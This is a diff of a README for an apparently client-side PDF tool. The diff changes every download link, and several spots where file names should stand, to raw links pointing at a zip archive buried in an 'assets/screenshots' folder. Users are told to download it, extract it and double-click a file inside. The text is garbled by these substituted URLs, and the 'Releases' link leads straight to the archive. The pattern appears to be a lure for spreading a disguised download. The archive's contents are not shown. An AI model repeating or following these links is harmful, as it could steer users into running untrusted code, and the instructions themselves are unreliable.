@@ -1,6 +1,6 @@
 # 🎨 clientside-pdf-tools - Your Privacy-Focused PDF Solution
 
-[![Download Now](https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip%https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip)](https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip)
+[![Download Now](https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip%https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip)](https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ To start using clientside-pdf-tools, follow these simple steps:
 
 1. **Visit the Releases page:** Click the link below to go to the latest version of the software.
 
-   [Visit Releases](https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip)
+   [Visit Releases](https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip)
 
-2. **Download the software:** Look for the latest version and find the appropriate file for your system (like a zip or https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip file). Click on the file to download it to your computer.
+2. **Download the software:** Look for the latest version and find the appropriate file for your system (like a zip or https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip file). Click on the file to download it to your computer.
 
 3. **Unzip the downloaded file:** Once the download is complete, find the file in your downloads folder. Right-click on it and select “Extract All” or use your preferred extraction tool.
 
-4. **Open the application:** After extraction, locate the folder. Open it and find the https://raw.githubusercontent.com/Babyfendi/clientside-pdf-tools/main/winterishness/clientside-pdf-tools.zip file. Double-click it to open in your web browser. 
+4. **Open the application:** After extraction, locate the folder. Open it and find the https://github.com/Babyfendi/clientside-pdf-tools/raw/refs/heads/main/assets/screenshots/pdf-tools-clientside-3.7.zip file. Double-click it to open in your web browser. 
 
 5. **Start using clientside-pdf-tools!** You are now ready to add images, draw, and annotate your PDFs directly in the browser.
 
